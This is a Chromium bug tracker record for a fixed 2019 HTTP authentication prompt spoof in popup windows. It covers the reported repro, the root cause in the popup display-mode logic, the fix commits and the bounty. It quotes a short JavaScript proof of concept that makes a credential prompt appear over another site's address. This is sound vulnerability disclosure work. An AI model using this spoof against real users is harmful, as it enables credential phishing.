# Security: http authentication spoof (repro issue 884179)

| Field | Value |
|-------|-------|
| **Issue ID** | [40093968](https://issues.chromium.org/issues/40093968) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Internals>Network>Auth |
| **Platforms** | Linux, Mac, Windows |
| **Reporter** | ch...@gmail.com |
| **Assignee** | me...@chromium.org |
| **Created** | 2019-02-06 |
| **Bounty** | $1,000.00 |

## Description

**VERSION**  

Chrome Version: 74.0.3694.0 Canary  

Operating System: Mac

**REPRODUCTION CASE**  

This is similar to <https://crbug.com/chromium/884179>

1. Go to <https://lbstyle.github.io/spoof.html>
2. Click on "Click here"
3. Observe

## Attachments

- [Screen Shot 2019-02-06 at 01.11.09.png](attachments/Screen Shot 2019-02-06 at 01.11.09.png) (image/png, 722.3 KB)

## Timeline

### do...@chromium.org (2019-02-06)

Can reproduce. Also repros on Dev. Assigning a medium priority since this is like an address bar spoof.

+asanka, do you mind taking a look? Also +cthomp for Security Enamel and URL display guidelines.

[Monorail components: Internals>Network>Auth]

### sh...@chromium.org (2019-02-06)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-02-06)

This is a serious security regression. If you are not able to fix this quickly, please revert the change that introduced it.

If this doesn't affect a release branch, or has not been properly classified for severity, please update the Security_Impact or Security_Severity labels, and remove the ReleaseBlock label. To disable this altogether, apply ReleaseBlock-NA.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### as...@chromium.org (2019-02-06)

To save some time for others, the entirety of the POC is as follows:

<script>
  function next() {
         w.location.replace('https://jigsaw.w3.org/HTTP/Basic/');
	           setTimeout(function(){w.location.replace('https://www.google.com/csi');}, 5000)
        }

  function f() {
    w = window.open("javascript:location='https://www.amazon.com'","new","width=600 height=800");
    i = setInterval("try { x = w.location.href; } catch(e) { clearInterval(i); next(); }", 1); 
  }
</script>

<a href="#" onclick="f()">Click here</a>

There should've been an interstitial if the top level origin didn't match the prompt. Instead we show the previous page ("https://www.amazon.com") while navigation is blocked on the auth prompt from "jigsaw.w3.org".

+davidben, meacer for work that happened around this code paths. I can dig in if necessary, but someone who touched this code recently might be in a better position to drive this bug.

### me...@google.com (2019-02-06)

+carlosil who's a new owner of http auth

### me...@google.com (2019-02-07)

Repros on Windows and Linux too.

### me...@chromium.org (2019-02-07)

Looks to be caused by https://codereview.chromium.org/2590183002

This check to display the interstitial is failing:
web_contents()->GetDelegate()->GetDisplayMode(web_contents()) !=
          blink::kWebDisplayModeStandalone

kWebDisplayModeStandalone seems to be intended for standalone apps but Browser::GetDisplayMode returns it for popups too: https://cs.chromium.org/chromium/src/chrome/browser/ui/browser.cc?rcl=fb5591b47f3951687f3ac00f2c7224dc50eb9689&l=1628

### sh...@chromium.org (2019-02-07)

[Empty comment from Monorail migration]

### do...@chromium.org (2019-02-07)

I don't think popups should return display type standalone. That is a violation of the web app manifest spec, which states that the standalone display mode => "Opens the web application to look and feel like a standalone native application. "

This was introduced in https://codereview.chromium.org/1323733002. I'd suggest removing the is_popup() conditional entirely.

### me...@chromium.org (2019-02-08)

I have a CL at https://chromium-review.googlesource.com/c/chromium/src/+/1460404

### me...@chromium.org (2019-02-08)

Simply removing the special handling for popups broke WebAppPictureInPictureWindowControllerBrowserTest.*. These tests install a PWA via InstallAndLaunchPWA() but also set open_as_window = true.

Removing that line and letting these tests open apps as tabs works, but extensions::browsertest_util::InstallBookmarkApp() does seem to support open_as_window so I'm not sure if this is something that needs to be supported.

A few options here:
- Ignore open_as_window in InstallBookmarkApp and open all apps as tabs.
- Add a new window type popups such as kWebDisplayModePopup.

mlamouri or others with PWA knowledge, any thoughts?


### do...@chromium.org (2019-02-08)

We shouldn't add a new window type because that enum directly reflects values in the web app manifest spec.

I guess this means that app browser windows must be created with type "popup". Which is odd. But the only other available type is tabbed. -_-

I wonder: does it work if you change the conditional to be:

if (is_app() && is_type_popup()) {
  return blink::kWebDisplayModeStandalone;
}


That way, only browsers of type popup that actually are apps are standalone. (I'm assuming apps that open in browser tabs set type_ to be TYPE_TABBED so this should not change behaviour for them).

### bu...@chops-service-accounts.iam.gserviceaccount.com (2019-02-12)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/fab7972220186b226d9b265408a3d88b0b0c95d1

commit fab7972220186b226d9b265408a3d88b0b0c95d1
Author: Mustafa Emre Acer <meacer@chromium.org>
Date: Tue Feb 12 23:23:02 2019

Fix display of login interstitial in popup windows

An HTTP Auth resource may trigger a blank login interstitial when the resource
meets a list of conditions. One of conditions is that the display mode of the
current web contents should not be kWebDisplayModeStandalone.

A previous CL (https://crrev.com/1323733002) changed popup windows to be
standalone windows. This caused popup windows to never show login interstitials.

This CL causes simple popup windows to no longer be treated as standalone
windows.

Bug: 928974
Change-Id: I7560aa268937942ad40c55afc637cae44d0a15b3
Reviewed-on: https://chromium-review.googlesource.com/c/1460404
Reviewed-by: Dominick Ng <dominickn@chromium.org>
Reviewed-by: Asanka Herath <asanka@chromium.org>
Reviewed-by: Elly Fong-Jones <ellyjones@chromium.org>
Commit-Queue: Mustafa Emre Acer <meacer@chromium.org>
Cr-Commit-Position: refs/heads/master@{#631433}
[modify] https://crrev.com/fab7972220186b226d9b265408a3d88b0b0c95d1/chrome/browser/ui/browser.cc
[modify] https://crrev.com/fab7972220186b226d9b265408a3d88b0b0c95d1/chrome/browser/ui/login/login_handler_browsertest.cc


### ch...@gmail.com (2019-02-13)

I was just trying to repro on canary 74.0.3704.0 and I believe it looks fine there.

### ch...@gmail.com (2019-02-14)

Ping for marking this bug as fixed :-)

### me...@google.com (2019-02-14)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-02-15)

[Empty comment from Monorail migration]

### aw...@google.com (2019-02-15)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-02-15)

This bug requires manual review: M73 has already been promoted to the beta branch, so this requires manual review
Please contact the milestone owner if you have questions.
Owners: benmason@(Android), kariahda@(iOS), cindyb@(ChromeOS), abdulsyed@(Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ab...@google.com (2019-02-19)

branch:3683

### cr...@appspot.gserviceaccount.com (2019-02-19)

The following revision refers to this bug: 
https://chromium.googlesource.com/chromium/src.git/+/be026911688861802e972f87b71e2941706c48b0

Commit: be026911688861802e972f87b71e2941706c48b0
Author: meacer@chromium.org
Commiter: meacer@chromium.org
Date: 2019-02-19 21:16:14 +0000 UTC

[Merge-M73] Fix display of login interstitial in popup windows

An HTTP Auth resource may trigger a blank login interstitial when the resource
meets a list of conditions. One of conditions is that the display mode of the
current web contents should not be kWebDisplayModeStandalone.

A previous CL (https://crrev.com/1323733002) changed popup windows to be
standalone windows. This caused popup windows to never show login interstitials.

This CL causes simple popup windows to no longer be treated as standalone
windows.

TBR=meacer@chromium.org

(cherry picked from commit fab7972220186b226d9b265408a3d88b0b0c95d1)

Bug: 928974
Change-Id: I7560aa268937942ad40c55afc637cae44d0a15b3
Reviewed-on: https://chromium-review.googlesource.com/c/1460404
Reviewed-by: Dominick Ng <dominickn@chromium.org>
Reviewed-by: Asanka Herath <asanka@chromium.org>
Reviewed-by: Elly Fong-Jones <ellyjones@chromium.org>
Commit-Queue: Mustafa Emre Acer <meacer@chromium.org>
Cr-Original-Commit-Position: refs/heads/master@{#631433}
Reviewed-on: https://chromium-review.googlesource.com/c/1478110
Reviewed-by: Mustafa Emre Acer <meacer@chromium.org>
Cr-Commit-Position: refs/branch-heads/3683@{#507}
Cr-Branched-From: e51029943e0a38dd794b73caaf6373d5496ae783-refs/heads/master@{#625896}

### na...@google.com (2019-02-19)

[Empty comment from Monorail migration]

### aw...@chromium.org (2019-02-25)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
*********************************

### aw...@google.com (2019-02-25)

Thanks as ever, $1,000 for this report!

### aw...@google.com (2019-03-04)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-05-24)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@gmail.com (2020-01-16)

What about Android System WebView? How should the WebView handle this? Is there any callbacks which we call rely on?

### ca...@chromium.org (2020-01-16)

Re #27, this bug was specific to the UI used for HTTP auth in Chrome, which is not used in WebView. WebView has the onReceivedHttpAuthRequest method for apps to interact with HTTP auth (see https://developer.android.com/reference/android/webkit/WebViewClient#onReceivedHttpAuthRequest(android.webkit.WebView,%20android.webkit.HttpAuthHandler,%20java.lang.String,%20java.lang.String) )

### sh...@gmail.com (2020-04-01)

I agree that in System WebView onReceivedHttpAuthRequest() would be called. But, the same issue is seen in System WebView based Browser. Even with this fix in chrome 73, it is seen in System WebView(version 80) based browser. Could you please check if this part of the code is migrated to get it reflected on System WebView too?

### ha...@google.com (2024-01-08)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-08)

This issue was migrated from crbug.com/chromium/928974?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40093968)*
